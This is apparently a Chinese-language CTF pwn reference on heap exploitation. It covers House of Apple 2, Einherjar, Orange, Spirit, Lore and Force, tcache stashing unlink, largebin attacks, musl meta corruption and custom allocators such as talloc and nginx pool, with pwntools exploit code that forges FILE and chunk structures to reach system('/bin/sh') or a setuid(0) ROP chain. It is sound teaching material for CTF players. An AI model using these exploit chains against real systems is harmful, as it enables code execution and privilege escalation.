# CTF Pwn - 堆利用技术

## 目录
- [House of Apple 2 — 针对 glibc 2.34+ 的 FSOP（0xFun 2026）](#house-of-apple-2--针对-glibc-234-的-fsop0xfun-2026)
  - [SUID 程序的 setcontext 变体（Midnight Flag 2026）](#suid-程序的-setcontext-变体midnight-flag-2026)
- [House of Einherjar — Off-by-One 空字节（0xFun 2026）](#house-of-einherjar--off-by-one-空字节0xfun-2026)
- [堆利用](#堆利用)
  - [通过应用层操作进行堆整形（Codegate 2013）](#通过应用层操作进行堆整形codegate-2013)
- [自定义分配器利用](#自定义分配器利用)
  - [talloc 池头部伪造实现任意读写（Boston Key Party 2016）](#talloc-池头部伪造实现任意读写boston-key-party-2016)
- [经典堆 Unlink 攻击（Crypto-Cat）](#经典堆-unlink-攻击crypto-cat)
- [musl libc 堆利用 — Meta 指针 + atexit（UNbreakable 2026）](#musl-libc-堆利用--meta-指针--atexitunbreakable-2026)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [House of Force（CSAW CTF 2016）](#house-of-forcecsaw-ctf-2016)
- [tcache Stashing Unlink 攻击](#tcache-stashing-unlink-攻击)
- [Unsafe Unlink 到 BSS + Top Chunk 合并（SECCON 2016）](#unsafe-unlink-到-bss--top-chunk-合并seccon-2016)
- [Largebin 攻击 — 专题技术（TravelGraph / Setjmp 2024）](#largebin-攻击--专题技术travelgraph--setjmp-2024)
- [tcache 2.39 变化 — Key、Count 与 calloc](#tcache-239-变化--keycount-与-calloc)
- [House of Tangerine — tcache 计数 + Unsorted Bin 变体](#house-of-tangerine--tcache-计数--unsorted-bin-变体)

关于 CTF 中特定的 UAF、tcache 和自定义分配器 writeup 变体 —— 包括 UAF 虚表指针编码、未初始化 chunk 残留数据泄漏、tcache strcpy 空字节溢出、相邻结构体函数指针溢出、隐藏菜单 tcache poisoning、tcache 双重释放劫持 stdout、tcache 提升为 fastbin、6-bit OOB 累加器、IS_MMAPED 位翻转、文件名正则 LSB fastbin，以及自定义分配器 unsafe unlink —— 参见 [heap-techniques-2.md](heap-techniques-2.md)。

关于 FILE 结构体（_IO_FILE）利用 —— 包括 fastbin stdout 虚表劫持、_IO_buf_base 空字节覆写、glibc 2.24+ 虚表校验绕过、针对 stdin FILE 字段的 unsorted bin 攻击、realloc-as-free UAF，以及引用计数回绕 —— 参见 [heap-fsop.md](heap-fsop.md)。

---

<a id="house-of-apple-2--fsop-for-glibc-234-0xfun-2026"></a>
## House of Apple 2 — 针对 glibc 2.34+ 的 FSOP（0xFun 2026）

**适用场景：** 现代 glibc（2.34+）移除了 `__free_hook`/`__malloc_hook`。House of Apple 2 通过 `_IO_wfile_jumps` 使用 FSOP。

**完整链路：** UAF → 泄漏 libc（unsorted bin 的 fd/bk）→ 泄漏堆地址（safe-linking 混淆后的 NULL）→ tcache poisoning 到 `_IO_list_all` → 伪造 FILE → exit 时触发 shell。

**伪造 FILE 结构体的要求：**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**触发链路：** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)`，其中 fp = `" sh\x00..."`。

**Safe-linking（glibc 2.32+）：** tcache 的 fd 指针被混淆：`fd = ptr ^ (chunk_addr >> 12)`。要污染 tcache：
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

<a id="setcontext-variant-for-suid-binaries-midnight-flag-2026"></a>
### SUID 程序的 setcontext 变体（Midnight Flag 2026）

利用 SUID-root 程序时，`system("/bin/sh")` 会失败，因为 dash 在 `uid != euid` 时会丢弃特权。将 `system(fp)` 的目标替换为 `setcontext(fp)`，把执行流转向先调用 `setuid(0)` 的 ROP 链：

```python
# Wide vtable targets setcontext instead of system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
})

# setcontext loads registers from the ucontext struct: __setcontext does
#   pushq %rdi / popq %rdx, so every load is relative to RDX in all
#   versions (2.28 and 2.39 alike) — RSP from [rdx+0xa0],
#   RIP from [rdx+0xa8], RDI (first argument) from [rdx+0x68].
#   (fp->_wide_data reaches setcontext as RDI via _IO_wdoallocbuf, but the
#   register loads inside __setcontext itself use RDX.)
# Place ROP chain at _wide_data structure:
fake_wide_data = flat({
    0x18: p64(0),                     # _IO_write_base = 0
    0x30: p64(0),                     # _IO_buf_base = 0
    0x68: p64(0),                     # RDI = 0 (for setuid(0))
    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
})

# ROP chain at rop_chain_addr:
rop = flat([
    pop_rdi_ret,
    libc.address + 0,               # After setuid(0) returns here
    # ... additional setup ...
    libc.sym.system,
    next(libc.search(b"/bin/sh\x00")),
])
```

**触发链路：** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → 栈迁移 → `setuid(0)` → `system("/bin/sh")`。

**关键洞察：** `setcontext` 是一个万能的栈迁移 gadget —— 它从可控内存中加载 RSP、RDI 和 RIP，使基于 FILE 的利用也能执行任意 ROP。对于 dash 强制 `uid == euid` 的 SUID 程序至关重要。

---

<a id="house-of-einherjar--off-by-one-null-byte-0xfun-2026"></a>
## House of Einherjar — Off-by-One 空字节（0xFun 2026）

**漏洞点：** 在 `malloc_usable_size` 末尾写入一个 off-by-one 的 NUL，清除下一个 chunk 的 `PREV_INUSE`。

**利用链：**
1. 设置下一个 chunk 的 `prev_size`，构造虚假的后向合并
2. 伪造 largebin 风格的 chunk，让 `fd/bk` 与 `fd_nextsize/bk_nextsize` 全部指向自身（可通过 `unlink_chunk()` 校验）
3. 合并后产生重叠 chunk，从而可以 tcache poisoning
4. 覆写 `stdout` 或 `_IO_list_all`，实施 FSOP

**关键要求：** 自引用 unlink 技巧必不可少。伪造的 chunk 必须通过 `unlink_chunk()` 的校验：它会检查 `FD->bk == P && BK->fd == P`，并且（对大 chunk）还要检查 `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`：

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**布置顺序：**
1. 分配 chunk A（较大，用于存放伪造 chunk）、B（填充）、C（存在 off-by-one 的受害者）
2. 把自引用指针构成的伪造 chunk 写入 A
3. 对 C 触发 off-by-one，清除 B 的 PREV_INUSE 并设置 B 的 prev_size
4. 释放 B → 与 A 后向合并 → 得到重叠 chunk
5. 在重叠区域上重新分配，从而控制其他仍在使用的 chunk

---

<a id="heap-exploitation"></a>
## 堆利用

- tcache poisoning（glibc 2.26+）
- fastbin dup / 双重释放
- House of Force（旧版 glibc）
- Unsorted bin 攻击
- 查看 glibc 版本：`strings libc.so.6 | grep GLIBC`

**通过未初始化内存进行堆信息泄漏：**
- 输出用户数据的错误消息可能夹带已释放 chunk 的元数据
- 已释放的 chunk 中含有 libc 指针（unsorted bin 中的 fd/bk）
- sprintf/strcpy 缺少空字节终止会泄漏相邻内存
- 主动触发错误条件来泄漏 libc/堆基址

**堆布局整形（heap feng shui）：**
- 通过控制分配顺序和大小来安排堆布局
- 先分配再释放，制造指定大小的空洞
- 把目标结构体放在溢出源的相邻位置
- 使用带递增偏移的喷射模式（例如步长 0x200）

<a id="heap-grooming-via-application-operations-codegate-2013"></a>
### 通过应用层操作进行堆整形（Codegate 2013）

**模式：** 利用多步应用层操作（论坛/笔记类程序中的创建/回复/删除）把堆调整到可控状态，便于利用。

**技法：**
1. 创建 N 条记录，把溢出载荷放在作者/标题/内容字段中
2. 为每条记录填充回复缓冲区（例如 127 条 `"sh"` 回复），把可控数据放到可预测的堆位置
3. 有选择地删除记录，制造特定的堆空洞
4. 重新分配记录，使其落入已释放的 chunk，并与存活元数据重叠

```python
# Example: Codegate 2013 Vuln 400 — board-based heap grooming
# Step 1: Create 7 posts with overflow in content field
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # Author overflow
        "A" * 604 + pack("I", got_addr) +    # Content overflow
        pack("I", plt_addr) * 80)            # Spray GOT targets

# Step 2: Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# Step 3: Delete 5 of 7 to create specific heap holes
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# Step 4: Allocate 2 new entries into freed space
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# Step 5: Trigger via modify + delete sequence
modify_post(target_id, trigger_payload)
delete_post(target_id)  # Triggers GOT overwrite → shell
```

**关键洞察：** 应用层操作（创建、回复、删除、修改）都对应确定大小的堆分配与释放。通过控制操作顺序和次数，可以借助程序自身的接口达到与直接操纵堆相同的效果。

<a id="custom-allocator-exploitation"></a>
## 自定义分配器利用

应用可能使用自定义分配器（nginx pool、Apache apr、游戏引擎）：

**nginx pool 结构：**
- pool 用析构回调把分配串成链
- `ngx_destroy_pool()` 会遍历 cleanup handler
- 溢出覆写析构函数指针 + 参数
- pool 释放时调用 `system(controlled_string)`

**通用思路：**
1. 逆向分配器元数据布局
2. 在结构体中寻找析构/回调指针
3. 溢出破坏该指针和第一个参数
4. 触发释放，调用被控制的函数

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

<a id="talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016"></a>
### talloc 池头部伪造实现任意读写（Boston Key Party 2016）

**模式：** talloc 是分层内存分配器（被 Samba、CUPS 等使用）。伪造字段可控的池头部，把分配重定向到任意地址。

```c
// talloc pool header fields: end, object_count, hdr_fill
// followed by talloc_chunk: next, prev, parent, child, refs, name, size, flags, pool
// Set pool boundaries to span target address
// Next allocation returns attacker-controlled address
// Read GOT for libc leak, write __free_hook with system()
```

**利用步骤：**
1. 通过应用数据泄漏堆地址
2. 伪造 talloc 池头部，让 `end` 越过目标地址
3. 下一次 `talloc()` 调用返回攻击者指定位置的地址
4. 用任意读（GOT）泄漏 libc，用任意写覆写 hook

**关键洞察：** 自定义分配器的池元数据决定后续分配落点。当应用使用 talloc 时，伪造池头部即可实现任意内存摆放。由于父子层级结构，破坏一个头部会沿分配树级联影响。

**参考：** Boston Key Party 2016

<a id="classic-heap-unlink-attack-crypto-cat"></a>
## 经典堆 Unlink 攻击（Crypto-Cat）

**适用场景：** 旧版 glibc（< 2.26，无 tcache）或教学型堆题。溢出某个 chunk 的元数据，破坏下一个 chunk 的 `prev_size` 和 `size` 字段，然后在 `free()` 时触发 unlink，把任意值写到任意地址。

**dlmalloc unlink 的工作方式：**
```c
// When free() consolidates with an adjacent free chunk:
// FD = P->fd, BK = P->bk
// FD->bk = BK    (write BK to FD + offset)
// BK->fd = FD    (write FD to BK + offset)
// This is a write-what-where primitive
```

**利用模式：**
1. 分配两个相邻 chunk（A 和 B）
2. 用 A 的数据溢出到 B 的 chunk 头：
   - 把 B 的 `prev_size` 设为 A 的数据大小（伪造“前一个 chunk 已释放”）
   - 清除 B 的 `size` 字段中的 `PREV_INUSE` 位
   - 在 A 的数据区构造假的 `fd` 和 `bk` 指针
3. 释放 B → `free()` 认为 A 也已释放，触发后向合并 → 对伪造 chunk 执行 unlink

```python
from pwn import *

# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow from A into B's header
payload = p64(0)              # fake prev_size for A
payload += p64(data_size)     # fake size for A (marks A as "free")
payload += p64(fake_fd)       # fd pointer
payload += p64(fake_bk)       # bk pointer
payload += b'A' * (data_size - 32)  # fill A's data
payload += p64(data_size)     # overwrite B's prev_size
payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit

# After free(B): target_addr now contains a pointer we control
```

**现代缓解措施：** glibc 2.26+ 增加了 safe-unlinking 校验（`FD->bk == P && BK->fd == P`）。面对现代堆，改用 tcache poisoning、House of Apple 2 或 House of Einherjar。

**关键洞察：** unlink 宏执行两次指针写入。通过控制伪造 chunk 中的 `fd` 和 `bk`，可以得到受限的 write-what-where：每个位置被写入另一个位置的值。经典用法是把 GOT 表项覆写为 win 函数或 shellcode 的地址。

---

<a id="musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026"></a>
## musl libc 堆利用 — Meta 指针 + atexit（UNbreakable 2026）

**模式（atypical-heap）：** 二进制链接的是 musl libc（而非 glibc）。musl 的分配器使用 `meta` 结构而非 chunk 头。OOB 读能泄漏 `meta->mem` 指针；任意写可以把分配重定向到可控地址。

**musl 分配器布局：**
- 每次分配属于一个 `group`，由 `meta` 结构管理
- `meta->mem` 指向该 group 的数据区
- 第一个 `0x70` 大小类的分配会把 `meta0->mem` 放在距 PIE 基址固定的偏移处（例如 `chall_base + 0x3f20`）

**利用链：**
1. **泄漏 meta 指针** —— 在堆分配偏移 `0x80` 处 OOB 读，读出 `meta` 结构体指针
2. **恢复 PIE 基址** —— `meta0->mem` 距二进制基址固定偏移
3. **重定向分配** —— 把 `meta->mem` 覆写为指向存活的 group 或目标地址。下一次从该 group 分配就会返回攻击者可控的内存
4. **atexit 劫持** —— 用 `system("cat flag")` 覆写 musl 的 `atexit` 处理函数列表。程序正常退出时即执行代码

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**关键洞察：** musl 的分配器元数据（`meta` 结构体）与堆数据分开存放，但通过可预测的偏移与二进制基址关联。与 glibc 不同，musl 没有 safe-linking，也没有 tcache —— 破坏 `meta->mem` 即可直接控制分配。`atexit` 处理函数列表是比 glibc 的 `__free_hook`（2.34+ 已移除）更简单的代码执行目标。

**识别方法：** 二进制使用 musl libc（检查 `ldd`，或 `strings binary | grep musl`）。菜单式堆题，提供读/写原语。

---

<a id="house-of-orange"></a>
## House of Orange

**模式：** 在不调用 `free()` 的情况下制造一块 unsorted bin 中的空闲 chunk。通过堆溢出把 top chunk 的 size 改成很小的值。下一次大分配会因 top chunk 不足而失败，迫使 `sysmalloc` 把旧 top chunk 释放进 unsorted bin。随后破坏这块空闲 chunk，用于 FSOP 或 tcache 攻击。

```python
# Step 1: Overflow to corrupt top chunk size
# Top chunk must have PREV_INUSE set and size aligned to page
# Size must be < MINSIZE away from page boundary
edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk

# Step 2: Request larger than corrupted top size
# Forces sysmalloc → old top freed into unsorted bin
add(0x1000, b'B')  # Triggers the free

# Step 3: Unsorted bin attack or FSOP from here
# Overwrite _IO_list_all via unsorted bin's bk pointer
```

**关键洞察：** House of Orange 从不调用 `free()` 就能得到一块空闲 chunk —— 这在二进制没有删除/释放功能时至关重要。被破坏的 top chunk size 必须满足：`(size & 0xFFF) == 0`（与页边界对齐）、`size >= MINSIZE`，并且 `PREV_INUSE` 位置位。

**前提：** 堆溢出能触及 top chunk 元数据。经典变体需要 glibc < 2.26；现代版本则需要 FSOP 链（House of Apple 2）。

---

<a id="house-of-spirit"></a>
## House of Spirit

**模式：** 在攻击者可控的内存（栈、.bss 或堆）中伪造一块 chunk，然后 `free()` 它使其进入某个 bin。下一次该大小的分配会返回这块伪造 chunk，从而获得对目标区域的写权限。

```python
# Forge fake fastbin chunk on the stack
# Need valid size field and next chunk's size for validation
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
    0,              # next chunk prev_size
    0x41,           # next chunk size (passes free() validation)
)

# Write fake chunk address somewhere the binary will free()
# e.g., overwrite a pointer that gets passed to free()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# Trigger free(target_ptr) → fake chunk enters fastbin
trigger_free()

# Next malloc(0x38) returns our fake chunk → write to controlled area
malloc_and_write(0x38, payload)
```

**关键洞察：** 关键约束是 `free()` 会同时校验该 chunk 的 size 和“下一个” chunk（位于 `chunk + size`）的 size。两者都必须看起来合法 —— 大小在 fastbin 范围内（64 位上为 0x20-0x80），且对齐与标志位正确。

---

<a id="house-of-lore"></a>
## House of Lore

**模式：** 破坏某个 smallbin chunk 的 `bk` 指针，使其指向攻击者可控内存中的伪造 chunk。当该 smallbin 用于分配时，伪造 chunk 会被链进 bin。第二次分配就返回这块伪造 chunk，获得任意写。

```python
# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Forge fake chunk in target area
# fake->fd must point back to the real smallbin chunk
# fake->bk must point to another valid-looking chunk (or same)
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → points back to legitimate chunk
    addr_of_fake2,              # bk → another fake or self
)

# Step 3: Overwrite chunk_a->bk to point to our fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Step 4: Two allocations from this smallbin
alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
```

**关键洞察：** 需要破坏一块已释放 smallbin chunk 的 `bk`。伪造 chunk 的 `fd` 必须指回一个 `bk` 指向伪造 chunk 的 chunk —— glibc 会校验 `victim->bk->fd == victim`。在较旧的 glibc 上这项检查更宽松。

---

<a id="house-of-force-csaw-ctf-2016"></a>
## House of Force（CSAW CTF 2016）

**模式：** 把 wilderness（top）chunk 的 size 字段覆写成极大值（例如 `0xffffffffffffffff`），然后请求一个精心计算的分配大小，把堆指针移动到任意地址（例如 GOT 表）。

```python
from pwn import *

elf = ELF('./target')
libc = ELF('./libc.so.6')

# Step 1: Overflow into top chunk header, set size to -1 (0xffffffffffffffff)
add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))

# Step 2: Calculate distance from top chunk to target (e.g., GOT entry)
# evil_size = target_address - current_top_chunk_ptr - metadata_size
target = elf.got['strtol']
evil_size = target - 16 - top_chunk_ptr

# Step 3: Allocate evil_size to advance top chunk pointer to target
add_card(evil_size - 25, b'')

# Step 4: Next allocation overlaps the target - write desired value
# Overwrite strtol@GOT with system() address
add_card(100, p64(libc.symbols['system']))

# Step 5: Trigger - next call to strtol(user_input) calls system(user_input)
io.sendline(b'/bin/sh')
```

**关键洞察：** House of Force 需要：(1) 溢出到 top chunk 以控制其 size 字段，(2) 一次大小由攻击者控制的 malloc 来调整堆指针位置，(3) 随后一次落在目标地址上的分配。它适用于 glibc < 2.29（该版本之后加入 top chunk size 校验）。

---

<a id="tcache-stashing-unlink-attack"></a>
## tcache Stashing Unlink 攻击

**模式：** 利用 `malloc()` 过程中 tcache 与 smallbin 的交互。当某个大小的 tcache 未满时，从 smallbin 进行的 `malloc()` 会把 smallbin 中剩余的 chunk “stash” 进 tcache。stash 过程中，`bk` 指针会未经完整校验就被跟随，从而可以把任意地址链入 tcache。

```python
# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
# The 2nd smallbin chunk has corrupted bk → target address

# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
for i in range(7):
    free(tcache_chunks[i])
# These two go to unsorted → smallbin after sorting
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large)  # Sort unsorted bin → chunks enter smallbin

# Step 2: Drain tcache
for i in range(7):
    malloc(target_size)

# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)

# Step 4: Allocate from smallbin
# malloc returns smallbin_chunk_1
# Stashing mechanism follows bk chain:
#   smallbin_chunk_2 gets stashed into tcache
#   Then follows corrupted bk → target gets stashed into tcache too!
malloc(target_size)

# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
malloc(target_size)  # Returns chunk_2
malloc(target_size)  # Returns target_addr → arbitrary write!
```

**关键洞察：** stash 过程中 glibc 会执行 `bck->fd = bin`（其中 `bck = victim->bk`），实际上把一个 main_arena 指针写到了 `target_addr`。这是很强的 write-what-where 原语。写入的值是堆/libc 地址（不完全可控），但已足够破坏 FILE 结构体、tcache 元数据或其他堆状态。

**前提：** glibc 2.29+（tcache 与 smallbin 的交互）。能够破坏一块已释放 smallbin chunk 的 `bk` 指针。

---

<a id="unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016"></a>
## Unsafe Unlink 到 BSS + Top Chunk 合并（SECCON 2016）

**模式：** 经典 unsafe unlink 把一个自引用指针写入 BSS 的 note 表后，在 BSS 中构造第二块伪造 chunk，让它的 size 从该 BSS 地址一直延伸到堆的 top chunk：`size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`。释放这块伪造 chunk 会把它与 top chunk 合并，实际上把堆的分配基址搬到了 BSS。之后的 malloc 返回与全局指针表重叠的内存，从而获得任意读写。

```python
# Step 1: Unsafe unlink places self-pointer at bss_table[3]
# Fake chunk: fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))

# Step 2: Fake BSS chunk with size spanning to top chunk
fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
delete_memo(1)  # consolidation moves top chunk to BSS

# Step 3: malloc now returns BSS memory — overwrite global pointers
add_memo(size, p64(environ_addr))  # write &environ into note slot
# read_memo leaks stack address from environ
```

**关键洞察：** 标准 unsafe unlink 只给一次写原语。该变体把 top chunk 合并武器化，升级为完全任意读写：之后任何 `malloc` 都返回与 BSS 重叠的内存，把一次写扩展成在全局数据段内的无限可控分配。

<a id="largebin-attack--dedicated-technique-travelgraph--setjmp-2024"></a>
## Largebin 攻击 — 专题技术（TravelGraph / Setjmp 2024）

**适用场景：** glibc 2.30+，存在可破坏 largebin chunk 的 `bk`、`bk_nextsize` 或 `fd_nextsize` 的堆溢出 / UAF。在 *TravelGraph (2024)* 和 *Setjmp (2024)* 中被使用的变体，此时 tcache 已满或不可达，只能走 unsorted/largebin 路径。

**背景 —— largebin 结构：**
```c
// glibc malloc/malloc.c — malloc_chunk for large sizes (0x400+)
struct malloc_chunk {
    size_t      prev_size;
    size_t      size;             // | PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
    struct malloc_chunk *fd;      // largebin doubly-linked list (insertion order)
    struct malloc_chunk *bk;
    struct malloc_chunk *fd_nextsize; // sorted by size (descending)
    struct malloc_chunk *bk_nextsize;
};
// Each largebin index holds chunks of a size range, sorted largest→smallest via fd_nextsize.
```

**largebin 的 safe-unlink 校验（glibc ≥ 2.30）：**
```c
// _int_free / unlink_chunk validation — large chunks must pass both:
if (chunksize(P) != prev_size(next_chunk(P))) abort();
if (FD->bk != P || BK->fd != P) abort();                          // fd/bk check
if (FD_nextsize->bk_nextsize != P || BK_nextsize->fd_nextsize != P) abort(); // nextsize check
```

**bk_nextsize 攻击原语：**

当把一个新的大 chunk `victim` 插入 largebin 且 `victim->size` 不是最大时：

```c
// malloc.c — insertion into largebin (simplified):
if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk_nextsize->...))) {
    fwd = bck;
    bck = bck->bk_nextsize;
    fwd->bk_nextsize = bck->bk_nextsize; // arbitrary write if bck->bk_nextsize corrupted
}
```

如果攻击者把某块已释放 largebin chunk 的 `bk_nextsize` 破坏为 `target - 0x20`，那么赋值 `fwd->bk_nextsize = victim` 会把 `victim`（堆地址）写到 `*(target)`。再做一次插入，攻击者还可以破坏 `bk`，把 `main_arena` 地址写到 `target`。

**经典 Largebin 攻击步骤（含 safe-unlink 绕过）：**

```python
from pwn import *

# 1. Allocate 2 large chunks (>0x400) that land in same largebin range
#    and a guard chunk to prevent consolidation.
a = malloc(0x428)  # A  -> will be freed to unsorted → largebin
b = malloc(0x428)  # B  -> second largebin chunk (size differs by 0x10 to trigger branch)
guard = malloc(0x28)

# 2. Free A to unsorted, then trigger sort into largebin via large allocation
free(a)
malloc(0x500)  # forces unsorted → largebin sorting; A now in largebin

# 3. Forge fake chunk that passes safe-unlink inside A (self-pointing)
#    Required for any later unlink/consolidation — otherwise free(B) aborts.
fake = flat({
    0x00: p64(0),
    0x08: p64(0x430 | 1),
    0x10: p64(a_addr),       # fd -> self
    0x18: p64(a_addr),       # bk -> self
    0x20: p64(a_addr),       # fd_nextsize -> self
    0x28: p64(a_addr),       # bk_nextsize -> self
})
edit(a, fake)  # overflow/UAF writes fake metadata into freed A

# 4. Corrupt B's bk_nextsize while B is still allocated or freed but not yet sorted
#    Goal: next largebin insertion writes heap addr to target (e.g., __free_hook, global array)
target = free_hook - 0x20  # bk_nextsize write is at offset 0x28 → target-0x20
edit(b, p64(0)*3 + p64(target))  # overwrite bk_nextsize field at +0x28

# 5. Free B → unsorted → next malloc sorts both A and B into largebin
#    Insertion path follows corrupted bk_nextsize → writes heap addr to target
free(b)
malloc(0x500)  # triggers largebin insertion → arbitrary heap write to target

# 6. Follow-up: overwrite target with system / stack pivot
#    Second variant: corrupt bk (fd/bk path) to write libc main_arena to target+8
```

**关键要求：**
- 同一个 bin 索引中至少有 2 个大 chunk 且大小不同（以便走到 `size < bck->bk_nextsize->size` 分支）。
- 需要溢出/UAF 在排序发生前覆写 `fd/bk/fd_nextsize/bk_nextsize`。
- safe-unlink 绕过：伪造 chunk 的四个指针全部指向自身（自引用）。除非触发合并，真实利用并不需要真的通过 unlink 校验 —— 纯粹的 largebin 插入只需要破坏 `bk_nextsize`，但任何发生合并的 `free()` 都必须通过完整校验。
- glibc 2.32+ 为 tcache 增加了 safe-linking，但 largebin 的 `bk_nextsize` 没有 —— largebin 的 nextsize 指针仍是裸指针，因此该原语在 2024 年的赛题中依然可用。

**TravelGraph / Setjmp（2024）要点：**
- 两道题都隔离了 tcache（计数耗尽或走 `calloc` 路径），强制走 unsorted/largebin 路径。
- TravelGraph 使用带 `size` 字段的 `Graph` 对象，该字段紧邻堆 chunk 元数据 —— 溢出 `size` 让 chunk 看起来更大，随后 largebin 插入覆写了一个函数指针表。
- Setjmp 以 `jmp_buf` 为目标：通过 largebin 的 `bk_nextsize` 写覆写 `__jmpbuf[6]`（保存的 RSP），在下一次 `longjmp` 时获得 RIP 控制。

**缓解措施与检测：**
- glibc 2.38 收紧了 `largebin` 插入：如果 `bk_nextsize->fd_nextsize != bck` 就提前 abort。绕过要求伪造的 `bk_nextsize` 链构成合法循环链表（自引用即可满足）。
- 永远先检查 tcache 计数 —— 如果 tcache bin 未满（2.39 上 count < 7），`free()` 会进 tcache 而非 unsorted/largebin。可以排空 tcache，或用 `calloc` 大小的分配来绕过（见 tcache 2.39 说明）。

---

<a id="tcache-239-changes--key-count-and-calloc"></a>
## tcache 2.39 变化 — Key、Count 与 calloc

**glibc 2.39 的 tcache 布局（x86-64）：**

```c
typedef struct tcache_entry {
    struct tcache_entry *next;  // +0x00: safe-linked (mangled)
    uintptr_t            key;   // +0x08: random tcache key (double-free detection)
} tcache_entry;

typedef struct tcache_perthread_struct {
    uint16_t      counts[TCACHE_MAX_BINS];  // +0x00: per-bin counts, 64 x 2 bytes = 0x80 bytes
    tcache_entry *entries[TCACHE_MAX_BINS]; // +0x80: heads (mangled next)
} tcache_perthread_struct;
// On 2.39, TCACHE_MAX_BINS=64, max count per bin = 7 (7 since 2.29, unchanged in 2.39)
```

**2.39 实际做了什么（malloc/malloc.c，tag glibc-2.39）：**
